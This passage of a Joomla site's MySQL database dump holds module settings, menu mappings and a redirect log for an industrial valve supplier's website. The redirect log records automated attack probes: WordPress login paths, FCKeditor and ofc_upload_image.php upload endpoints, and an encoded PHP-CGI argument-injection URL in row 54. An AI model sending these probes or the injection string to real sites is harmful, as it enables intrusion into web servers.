shortly.","email_copy_summary":"0","spam_check":"1","spam_words":"www,http,url=,href=,link=,.txt,shit,fuck","spam_detected_text":"We are sorry, but it seems that your message contains unwanted advertising therefore it <b>has been blocked<\\/b>.<br \\/>Please try again avoiding words such as <i>www, http,<\\/i> and similar.","spam_detected_textdisplay":"1","stdcaptchadisplay":"1","stdcaptcha":"Verification Code","stdcaptchatype":"0","stdcaptcha_length":"5","stdcaptchawidth":"150","stdcaptchaheight":"75","stdcaptchafont":"-1","stdcaptchafontmin":"14","stdcaptchafontmax":"20","stdcaptchaangle":"20","stdcaptcha_backgroundcolor":"#ffffff","stdcaptcha_textcolor":"#191919","stdcaptcha_disturbcolor":"#c8c8c8","layout":"_:default","css":"bootstrap.css","moduleclass_sfx":" contactusmodule","acymailing":"0","acymailing_checkboxes":"hidden|hidden","acymailing_auto_checked":"0","jnews":"0","jnews_checkboxes":"hidden|hidden","jnews_auto_checked":"0","othernewsletters":"1","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(104, 'SOR (Right  hand side)', '', '<p><img alt="DPS 107EL Explosion Proof Glam" src="images/sor/DPS_107EL_Explosion_Proof_Glam.jpg" height="185" width="230" /></p>\r\n<p><img alt="LS 102 Flanged Glam" src="images/sor/LS_102_Flanged_Glam.jpg" height="297" width="230" /></p>\r\n<p><img alt="PS NN Pivot Seal Weatherproof Glam" src="images/sor/PS_NN_Pivot_Seal_Weatherproof_Glam.jpg" height="171" width="230" /></p>\r\n<p><img alt="TS B3 Explosion Proof" src="images/sor/TS_B3_Explosion_Proof.jpg" height="184" width="230" /></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(105, 'valve (right hand side)', '', '<p><img alt="1" src="images/newimages/valve/1.png" height="215" width="230" /></p>\r\n<p><img alt="2" src="images/newimages/valve/2.png" height="133" width="230" /></p>\r\n<p><img alt="3" src="images/newimages/valve/3.jpg" height="277" width="230" /></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(106, 'safety (right handside)', '', '<p>&nbsp; <img alt="Birkett Safety Relief Valves 620x250" src="images/Birkett_Safety_Relief_Valves_620x250.jpeg" height="249" width="231" /></p>\r\n<p>&nbsp;<img alt="sds" src="images/newimages/birkett/sds.jpg" height="351" width="198" /></p>\r\n<p><img alt="33" src="images/newimages/birkett/33.jpg" height="319" width="135" />&nbsp;</p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(107, 'footer new menu', '', '<div style="width: 540px;">\r\n<div style="width: 25%; float: left;">\r\n\r\n<span style="color: #ffffff;"> <a href="/"> <span style="color: #ffffff;"><strong>Home</strong></span></a></span><br /> <span style="color: #ffffff;"><a href="/about-us"><span style="color: #ffffff;"><strong>About us</strong></span></a></span><br /> <span style="color: #ffffff;"><a href="/contact-us"><span style="color: #ffffff;"><strong>Contact Us</strong></span></a></span></div>\r\n\r\n<div style="width: 25%; float: left;"><span style="color: #ffffff;"><strong>Products</strong></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/products/red-valve"><span style="color: #ffffff;">Red Valve</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/products/tideflex"><span style="color: #ffffff;">Tideflex</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/products/wey"><span style="color: #ffffff;">Wey</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/products/noreva"><span style="color: #ffffff;">Noreva</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/products/valvtechnologies"><span style="color: #ffffff;">Valvtechnologies</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/products/birkett"><span style="color: #ffffff;">Birkett</span></a></span></div>\r\n<div style="width: 25%; float: left;"></br><span style="color: #ffffff;">&nbsp; - <a href="/products/mts"><span style="color: #ffffff;">MTS</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/products/copes"><span style="color: #ffffff;">Copes</span></a></span></br><span style="color: #ffffff;">&nbsp; - <a href="/products/sor"><span style="color: #ffffff;">SOR</span></a></span></div>\r\n\r\n<div style="width: 25%; float: left;"><span style="color: #ffffff;"><strong>Application Sector</strong></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/application-sectors/power"><span style="color: #ffffff;">Power</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/application-sectors/water"><span style="color: #ffffff;">Water</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/application-sectors/mining"><span style="color: #ffffff;">Mining</span></a></span><br /> <span style="color: #ffffff;">&nbsp; - <a href="/application-sectors/oil-and-gas"><span style="color: #ffffff;">Oil and Gas</span></a></span></div>\r\n</div>', 1, 'position-9', 32, '2013-06-19 06:52:25', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(108, 'water (right handside)', '', '<p><a href="/application-sectors/water"><img alt="home-3-water" src="images/newimages/homepageboxes/home-3-water.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/mining"><img alt="home-1-mining" src="images/newimages/homepageboxes/home-1-mining.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/oil-and-gas"><img alt="home-2-oil-and-gas" src="images/newimages/homepageboxes/home-2-oil-and-gas.jpg" height="68" width="209" /></a></p>\r\n\r\n<p><a href="/application-sectors/power"><img alt="home-4-power" src="images/newimages/homepageboxes/home-4-power.jpg" height="68" width="209" /></a></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(109, 'mining sidebar righthand', '', '<p><a href="/application-sectors/mining"><img alt="home-1-mining" src="images/newimages/homepageboxes/home-1-mining.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/oil-and-gas"><img alt="home-2-oil-and-gas" src="images/newimages/homepageboxes/home-2-oil-and-gas.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/water"><img alt="home-3-water" src="images/newimages/homepageboxes/home-3-water.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/power"><img alt="home-4-power" src="images/newimages/homepageboxes/home-4-power.jpg" height="68" width="209" /></a></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(110, 'Oil and Gas right handside', '', '\r\n<p><a href="/application-sectors/oil-and-gas"><img alt="home-2-oil-and-gas" src="images/newimages/homepageboxes/home-2-oil-and-gas.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/water"><img alt="home-3-water" src="images/newimages/homepageboxes/home-3-water.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/mining"><img alt="home-1-mining" src="images/newimages/homepageboxes/home-1-mining.jpg" height="68" width="209" /></a></p>\r\n\r\n<p><a href="/application-sectors/power"><img alt="home-4-power" src="images/newimages/homepageboxes/home-4-power.jpg" height="68" width="209" /></a></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(111, 'Unite Revolution Slider', '', '', 1, 'position-0', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_unite_revolution', 1, 0, '{"sliderid":"1","include_jquery":"true","js_load_type":"head","no_conflict_mode":"false","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"itemid","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(112, 'mts Page (Right Hand Side) ', '', '<p><img alt="3" src="images/newimages/mts/3.jpg" height="173" width="231" /></p>\r\n<p>&nbsp;<img alt="4" src="images/newimages/mts/4.jpg" height="223" width="223" /></p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(113, 'CopesPage (Right Hand Side)  (2)', '', '<p><img alt="1" src="images/newimages/copes/1.jpg" height="132" width="230" /></p>\r\n<p>&nbsp;<img alt="11" src="images/newimages/copes/11.jpg" height="133" width="234" /></p>\r\n<p>&nbsp;<img alt="111" src="images/newimages/copes/111.jpg" height="184" width="230" /></p>\r\n<p><img alt="1111" src="images/newimages/copes/1111.jpg" height="161" width="281" /></p>\r\n<p>&nbsp;</p>', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"1","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*'),
(114, 'power sidebar righthand', '', '<p><a href="/application-sectors/power"><img alt="home-4-power" src="images/newimages/homepageboxes/home-4-power.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/mining"><img alt="home-1-mining" src="images/newimages/homepageboxes/home-1-mining.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/oil-and-gas"><img alt="home-2-oil-and-gas" src="images/newimages/homepageboxes/home-2-oil-and-gas.jpg" height="68" width="209" /></a></p>\r\n<p><a href="/application-sectors/water"><img alt="home-3-water" src="images/newimages/homepageboxes/home-3-water.jpg" height="68" width="209" /></a></p>\r\n', 1, 'position-7', 0, '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 'mod_custom', 1, 0, '{"prepare_content":"0","backgroundimage":"","layout":"_:default","moduleclass_sfx":"","cache":"1","cache_time":"900","cachemode":"static","module_tag":"div","bootstrap_size":"0","header_tag":"h3","header_class":"","style":"0"}', 0, '*');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_modules_menu`
--

CREATE TABLE IF NOT EXISTS `j6kpf_modules_menu` (
  `moduleid` int(11) NOT NULL DEFAULT '0',
  `menuid` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`moduleid`,`menuid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `j6kpf_modules_menu`
--

INSERT INTO `j6kpf_modules_menu` (`moduleid`, `menuid`) VALUES
(1, 0),
(2, 0),
(3, 0),
(4, 0),
(6, 0),
(7, 0),
(8, 0),
(9, 0),
(10, 0),
(12, 0),
(13, 0),
(14, 0),
(15, 0),
(16, 0),
(17, 103),
(17, 104),
(17, 105),
(17, 106),
(17, 112),
(17, 113),
(17, 114),
(17, 115),
(17, 116),
(17, 117),
(17, 118),
(17, 119),
(17, 120),
(17, 121),
(17, 122),
(79, 0),
(86, 0),
(87, 101),
(88, 101),
(89, 101),
(90, 101),
(91, 0),
(92, 0),
(93, 0),
(94, 0),
(95, 103),
(96, 0),
(97, 115),
(98, 106),
(99, 112),
(100, 113),
(101, 114),
(103, 106),
(104, 118),
(105, 116),
(106, 117),
(107, 0),
(108, 120),
(109, 121),
(110, 122),
(111, 101),
(112, 125),
(113, 126),
(114, 119);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_newsfeeds`
--

CREATE TABLE IF NOT EXISTS `j6kpf_newsfeeds` (
  `catid` int(11) NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(100) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `link` varchar(200) NOT NULL DEFAULT '',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `numarticles` int(10) unsigned NOT NULL DEFAULT '1',
  `cache_time` int(10) unsigned NOT NULL DEFAULT '3600',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `rtl` tinyint(4) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `description` text NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `images` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`published`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_overrider`
--

CREATE TABLE IF NOT EXISTS `j6kpf_overrider` (
  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `constant` varchar(255) NOT NULL,
  `string` text NOT NULL,
  `file` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_redirect_links`
--

CREATE TABLE IF NOT EXISTS `j6kpf_redirect_links` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `old_url` varchar(255) NOT NULL,
  `new_url` varchar(255) NOT NULL,
  `referer` varchar(150) NOT NULL,
  `comment` varchar(255) NOT NULL,
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `published` tinyint(4) NOT NULL,
  `created_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_date` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_link_old` (`old_url`),
  KEY `idx_link_modifed` (`modified_date`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2066 ;

--
-- Dumping data for table `j6kpf_redirect_links`
--

INSERT INTO `j6kpf_redirect_links` (`id`, `old_url`, `new_url`, `referer`, `comment`, `hits`, `published`, `created_date`, `modified_date`) VALUES
(1, 'http://flotech.webande-commercesolutions.com/2013-04-12-06-11-37/2013-04-30-06-17-43', '', 'http://flotech.webande-commercesolutions.com/', '', 1, 0, '2013-05-15 04:20:33', '0000-00-00 00:00:00'),
(2, 'http://flotech.webande-commercesolutions.com/contact-u', '', '', '', 1, 0, '2013-05-30 03:11:19', '0000-00-00 00:00:00'),
(3, 'http://flotech.webande-commercesolutions.com/2013-04-12-06-12-00/mining', '', '', '', 1, 0, '2013-06-07 02:54:16', '0000-00-00 00:00:00'),
(4, 'http://www.flotechcontrols.com/contact.html', 'http://www.flotechcontrols.com/contact-us', '', '', 1, 1, '2013-06-28 06:55:08', '2013-07-04 04:30:49'),
(5, 'http://flotechcontrols.com/wp-login.php', '', '', '', 1, 0, '2013-06-28 22:10:11', '0000-00-00 00:00:00'),
(6, 'http://flotechcontrols.com/admin/', '', '', '', 1, 0, '2013-06-28 22:10:12', '0000-00-00 00:00:00'),
(7, 'http://www.flotechcontrols.com/about.html', 'http://www.flotechcontrols.com/about-us', 'http://in.search.yahoo.com/search;_ylt=AljXugEAn6pchoVReRIKWzeuitIF;_ylc=X1MDOTc2ODQxNDIEX3IDMgRmcgN5ZnAtdC03MDQEbl9ncHMDMARvcmlnaW4DaW4ueWFob28uY29tB', '', 1, 1, '2013-06-29 11:19:29', '2013-07-04 04:30:37'),
(8, 'http://www.flotechcontrols.com/about.html?referer=www.clickfind.com.au', '', '', '', 1, 0, '2013-07-02 19:01:01', '0000-00-00 00:00:00'),
(9, 'http://flotechcontrols.com/about.html', 'http://www.flotechcontrols.com/about-us', '', '', 1, 1, '2013-07-03 05:21:33', '2013-07-04 04:30:22'),
(10, 'http://www.flotechcontrols.com/about-us%20/', '', '', '', 1, 0, '2013-07-03 11:32:14', '0000-00-00 00:00:00'),
(11, 'http://www.flotechcontrols.com/%20/', '', '', '', 1, 0, '2013-07-03 11:32:15', '0000-00-00 00:00:00'),
(12, 'http://www.flotechcontrols.com/contact-us%20/', '', '', '', 1, 0, '2013-07-03 11:32:20', '0000-00-00 00:00:00'),
(13, 'www.flotechcontrols.com/products/valves.html', 'http://www.flotechcontrols.com/products/red-valve', '', '', 0, 1, '2013-07-04 04:29:47', '0000-00-00 00:00:00'),
(14, 'http://flotechcontrols.com/wp-trackback.php', '', '', '', 1, 0, '2013-07-06 02:36:10', '0000-00-00 00:00:00'),
(15, 'http://flotechcontrols.com/blog/wp-trackback.php', '', '', '', 1, 0, '2013-07-06 02:36:11', '0000-00-00 00:00:00'),
(16, 'http://flotechcontrols.com/wp/wp-trackback.php', '', '', '', 1, 0, '2013-07-06 02:36:12', '0000-00-00 00:00:00'),
(17, 'http://flotechcontrols.com/wordpress/wp-trackback.php', '', '', '', 1, 0, '2013-07-06 02:36:13', '0000-00-00 00:00:00'),
(18, 'http://flotechcontrols.com/news/wp-trackback.php', '', '', '', 1, 0, '2013-07-06 02:36:14', '0000-00-00 00:00:00'),
(19, 'http://www.flotechcontrols.com/blog', '', '', '', 1, 0, '2013-07-07 21:53:16', '0000-00-00 00:00:00'),
(20, 'http://www.flotechcontrols.com/blog/', '', '', '', 1, 0, '2013-07-07 21:53:20', '0000-00-00 00:00:00'),
(21, 'http://www.flotechcontrols.com//wp-login.php', '', '', '', 1, 0, '2013-07-09 10:43:40', '0000-00-00 00:00:00'),
(22, 'http://flotechcontrols.com/contact.html', '', '', '', 1, 0, '2013-07-09 18:15:30', '0000-00-00 00:00:00'),
(23, 'http://flotechcontrols.com/www.valv.com/', '', '', '', 1, 0, '2013-07-10 03:36:13', '0000-00-00 00:00:00'),
(24, 'http://FLOTECHCONTROLS.COM/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 'http://FLOTECHCONTROLS.COM/fckeditor/editor/filemanager/connectors/uploadtest.html', '', 1, 0, '2013-08-02 04:19:59', '0000-00-00 00:00:00'),
(25, 'http://FLOTECHCONTROLS.COM/admin/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', 'http://FLOTECHCONTROLS.COM/admin/FCKeditor/editor/filemanager/connectors/uploadtest.html', '', 1, 0, '2013-08-02 04:19:59', '0000-00-00 00:00:00'),
(26, 'http://FLOTECHCONTROLS.COM/FCKeditor/editor/filemanager/upload/test.html', '', 'http://FLOTECHCONTROLS.COM/FCKeditor/editor/filemanager/upload/test.html', '', 1, 0, '2013-08-02 04:19:59', '0000-00-00 00:00:00'),
(27, 'http://www.flotechcontrols.com/menu', '', '', '', 1, 0, '2013-08-04 03:36:44', '0000-00-00 00:00:00'),
(28, 'http://www.flotechcontrols.com/application', '', '', '', 1, 0, '2013-08-04 03:38:18', '0000-00-00 00:00:00'),
(29, 'http://flotechcontrols.com/:', '', 'http://flotechcontrols.com/', '', 1, 0, '2013-08-04 21:16:43', '0000-00-00 00:00:00'),
(30, 'http://flotechcontrols.com/,', '', 'http://flotechcontrols.com/', '', 1, 0, '2013-08-04 21:16:43', '0000-00-00 00:00:00'),
(31, 'http://flotechcontrols.com/forum', '', '', '', 1, 0, '2013-08-06 09:55:32', '0000-00-00 00:00:00'),
(32, 'http://flotechcontrols.com/wordpress/wp-admin/', '', '', '', 1, 0, '2013-08-06 16:13:23', '0000-00-00 00:00:00'),
(33, 'http://flotechcontrols.com/blog/wp-admin/', '', '', '', 1, 0, '2013-08-06 16:23:05', '0000-00-00 00:00:00'),
(34, 'http://flotechcontrols.com/wp-admin/', '', '', '', 1, 0, '2013-08-06 16:40:55', '0000-00-00 00:00:00'),
(35, 'http://flotechcontrols.com/forum/', '', '', '', 1, 0, '2013-08-07 18:34:07', '0000-00-00 00:00:00'),
(36, 'http://www.flotechcontrols.com/wp-login.php', '', '', '', 1, 0, '2013-08-10 09:27:32', '0000-00-00 00:00:00'),
(37, 'http://www.flotechcontrols.com/70ok6gaanl6nna18.html', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2013-08-11 16:03:26', '0000-00-00 00:00:00'),
(38, 'http://flotechcontrols.com/xbd06tgb8kuz8wk7.html', '', 'http://flotechcontrols.com/', '', 1, 0, '2013-08-13 17:25:43', '0000-00-00 00:00:00'),
(39, 'http://www.flotechcontrols.com/aiiz9g0s0dsoxo6e.html', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2013-08-14 01:53:41', '0000-00-00 00:00:00'),
(40, 'http://flotechcontrols.com/forums/', '', '', '', 1, 0, '2013-08-14 18:38:55', '0000-00-00 00:00:00'),
(41, 'http://www.flotechcontrols.com/www.valv.com/', '', '', '', 1, 0, '2013-08-17 03:05:50', '0000-00-00 00:00:00'),
(42, 'http://flotechcontrols.com/admin.php', '', '', '', 1, 0, '2013-08-18 19:37:06', '0000-00-00 00:00:00'),
(43, 'http://flotechcontrols.com/admin/index.php', '', '', '', 1, 0, '2013-08-27 21:30:25', '0000-00-00 00:00:00'),
(44, 'http://flotechcontrols.com/typo3/index.php', '', '', '', 1, 0, '2013-08-27 21:30:28', '0000-00-00 00:00:00'),
(45, 'http://FLOTECHCONTROLS.com/wp-includes/js/tinymce/wp-mce-help.php', '', '', '', 1, 0, '2013-08-29 10:41:01', '0000-00-00 00:00:00'),
(46, 'http://flotechcontrols.com/domainsigma_removal_d6a0f98ed16334bae067a84e94aa590dd1e4ee42.html', '', '', '', 1, 0, '2013-09-01 07:56:59', '0000-00-00 00:00:00'),
(47, 'http://www.flotechcontrols.com//sites/all/modules/civicrm/packages/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2013-09-01 12:26:59', '0000-00-00 00:00:00'),
(48, 'http://www.flotechcontrols.com//components/com_acymailing/inc/openflash/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2013-09-01 12:27:00', '0000-00-00 00:00:00'),
(49, 'http://www.flotechcontrols.com//components/com_jnews/includes/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2013-09-01 12:27:00', '0000-00-00 00:00:00'),
(50, 'http://www.flotechcontrols.com//components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2013-09-01 12:27:01', '0000-00-00 00:00:00'),
(51, 'http://www.flotechcontrols.com//components/com_jinc/classes/graphics/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2013-09-01 12:27:02', '0000-00-00 00:00:00'),
(52, 'http://www.flotechcontrols.com//library/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2013-09-01 12:27:03', '0000-00-00 00:00:00'),
(53, 'http://www.flotechcontrols.com//components/com_jnewsletter/includes/openflashchart/php-ofc-library/ofc_upload_image.php', '', '', '', 1, 0, '2013-09-01 12:27:03', '0000-00-00 00:00:00'),
(54, 'http://www.flotechcontrols.com/%70%68%70%70%61%74%68/%70%68%70?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64', '', '', '', 1, 0, '2013-09-01 16:28:06', '0000-00-00 00:00:00'),
(55, 'http://flotechcontrols.com/admin/fckeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F', '', '', '', 1, 0, '2013-09-07 01:21:45', '0000-00-00 00:00:00'),
(56, 'http://flotechcontrols.com/admin/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F', '', '', '', 1, 0, '2013-09-07 01:21:46', '0000-00-00 00:00:00'),
(57, 'http://flotechcontrols.com/FCK/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F', '', '', '', 1, 0, '2013-09-07 01:21:47', '0000-00-00 00:00:00'),
(58, 'http://flotechcontrols.com/FCK/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F', '', '', '', 1, 0, '2013-09-07 01:21:48', '0000-00-00 00:00:00'),
(59, 'http://flotechcontrols.com/FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F', '', '', '', 1, 0, '2013-09-07 01:21:49', '0000-00-00 00:00:00'),
(60, 'http://flotechcontrols.com/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=%2F', '', '', '', 1, 0, '2013-09-07 01:21:50', '0000-00-00 00:00:00'),
(61, 'http://flotechcontrols.com/prqrsket9e06mgzv.html', '', 'http://flotechcontrols.com/', '', 1, 0, '2013-09-08 18:10:33', '0000-00-00 00:00:00'),
(62, 'http://www.flotechcontrols.com/cy651qz9pcg0lmbh.html', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2013-09-09 00:14:00', '0000-00-00 00:00:00'),
(63, 'http://www.flotechcontrols.com/,', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2013-09-19 13:57:31', '0000-00-00 00:00:00'),
(64, 'http://www.flotechcontrols.com/:', '', 'http://www.flotechcontrols.com/', '', 1, 0, '2013-09-19 13:57:32', '0000-00-00 00:00:00'),
(65, 'http://flotechcontrols.com/wp/wp-admin/', '', '', '', 1, 0, '2013-09-22 10:57:44', '0000-00-00 00:00:00'),
(66, 'http://FLOTECHCONTROLS.COM/webalizer/usage_201309.html', '', 'http://FLOTECHCONTROLS.COM/webalizer/usage_201309.html', '', 1, 0, '2013-09-26 18:42:41', '0000-00-00 00:00:00'),
(67, 'http://flotechcontrols.com/webalizer/', '', 'http://flotechcontrols.com/webalizer/', '', 1, 0, '2013-10-04 11:36:53', '0000-00-00 00:00:00'),
(68, 'http://FLOTECHCONTROLS.COM/stats/usage_201309.html', '', 'http://FLOTECHCONTROLS.COM/stats/usage_201309.html', '', 1, 0, '2013-10-07 04:02:53', '0000-00-00 00:00:00'),
(69, 'http://FLOTECHCONTROLS.COM/blog/', '', 'http://FLOTECHCONTROLS.COM/blog/', '', 1, 0, '2013-10-08 17:44:06', '0000-00-00 00:00:00'),
(70, 'http://www.flotechcontrols.com/user/register', '', 'http://lesbleuslaserie.forumpro.fr/?q=user/register', '', 1, 0, '2013-10-11 05:16:51', '0000-00-00 00:00:00'),
(71, 'http://www.flotechcontrols.com/node/add', '', 'http://www.juegoscocinagratis.net/node/add', '', 1, 0, '2013-10-15 22:18:10', '0000-00-00 00:00:00'),
(72, 'http://www.flotechcontrols.com/wp-admin', '', '', '', 1, 0, '2013-11-01 10:11:01', '0000-00-00 00:00:00'),
(73, 'http://www.flotechcontrols.com/blog//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:29', '0000-00-00 00:00:00'),
(74, 'http://www.flotechcontrols.com/wordpress//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:30', '0000-00-00 00:00:00'),
(75, 'http://www.flotechcontrols.com/wp//wp-login.php', '', '', '', 1, 0, '2013-11-08 11:41:31', '0000-00-00 00:00:00'),
